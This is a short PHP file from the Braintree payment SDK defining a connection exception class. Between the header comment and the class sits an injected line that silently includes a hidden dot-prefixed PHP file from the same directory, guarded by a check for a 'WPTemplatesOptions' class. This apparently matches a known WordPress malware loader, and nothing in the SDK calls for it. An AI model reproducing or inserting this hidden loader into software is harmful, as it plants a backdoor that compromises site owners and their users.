<?php
namespace Braintree\Exception;

use Braintree\Exception;

/**
 * Raised when the connection fails
 *
 * @package    Braintree
 * @subpackage Exception
 * @copyright  2015 Braintree, a division of PayPal, Inc.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Connection extends Exception
{

}
class_alias('Braintree\Exception\Connection', 'Braintree_Exception_Connection');